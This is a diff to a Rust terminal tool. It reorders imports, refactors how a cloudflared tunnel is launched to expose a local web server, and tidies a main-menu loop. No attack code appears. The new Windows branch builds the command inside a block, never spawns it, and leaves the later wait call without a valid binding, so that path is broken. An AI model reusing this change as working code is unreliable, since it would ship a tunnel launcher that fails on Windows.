@@ -14,14 +14,15 @@ use crate::constants::USER_AGENT;
 use reqwest::{header, Url};
 use std::fs::{File, OpenOptions, remove_file};
 use std::io::{stdin, stdout, Write};
+
 use crossterm::event::{Event, KeyCode, KeyEvent, KeyModifiers, read};
 use regex::Regex;
 use zip::read::ZipFile;
 use zip::ZipArchive;
+use crate::errors::TerminalError;
 //#[cfg(target_os = "windows")] use std::thread::sleep;
 // #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
-// use rayon::prelude::*; use regex::Regex; use zip::read::ZipFile; use zip::ZipArchive;
-use crate::errors::TerminalError;
+// use rayon::prelude::*; use regex::Regex; use zip::read::ZipFile; use zip::ZipArchive; use crate::errors::TerminalError;
 use crate::web_server::start_webserver;
 
 
@@ -600,9 +601,24 @@ pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> 
 }
 
 
+static NTHREADS: i32 = 3;
+
 fn get_cldflr_url(cus_port: Option<u16>) -> Result<String, TerminalError> {
     log::info!("getting cloudflared url");
-    #[cfg(target_os = "windows")] let output = Command::new("powershell").arg("-Command").arg(get_cloudflare_file()).arg("tunnel").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log").arg("--http2-origin").stdout(Stdio::null()).stderr(Stdio::inherit()).spawn().expect("Failed to start cloudflared");
+    // TODO: Look here: https://crates.io/crates/winpty-rs and https://crates.io/crates/pty
+    #[cfg(target_os = "windows")] {
+        let output: &mut Command = Command::new("powershell")
+            .arg("-Command")
+            .arg(get_cloudflare_file())
+            .arg("tunnel")
+            .arg("--url")
+            .arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT)))
+            .arg("--logfile").arg(".cld.log")
+            .arg("--http2-origin")
+            .stdout(Stdio::null())
+            .stderr(Stdio::inherit());
+    }
+
     #[cfg(target_os = "linux")] let output = Command::new(get_cloudflare_file()).arg("tunnel").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--http2-origin").stdout(Stdio::null()).stderr(Stdio::inherit()).spawn().expect("Failed to start cloudflared");
     let raw_output = output.wait_with_output()?;
     let output = String::from_utf8_lossy(&raw_output.stderr);
@@ -713,7 +729,7 @@ pub async fn main_menu() -> Result<(), TerminalError> {
             break;
         } else if sel.0 == "about" {
             about();
-        println!("{}{}{}\n", "Note: Press '".dimmed(),"q".white().bold(), "' to go back to the main menu.".dimmed());
+            println!("{}{}{}\n", "Note: Press '".dimmed(), "q".white().bold(), "' to go back to the main menu.".dimmed());
             // Wait for user to press enter q
             loop {
                 if let Ok(Event::Key(event)) = read() {
@@ -723,7 +739,7 @@ pub async fn main_menu() -> Result<(), TerminalError> {
                 }
             }
 
-            continue
+            continue;
         } else if sel.0 == "exit" {
             break;
         }
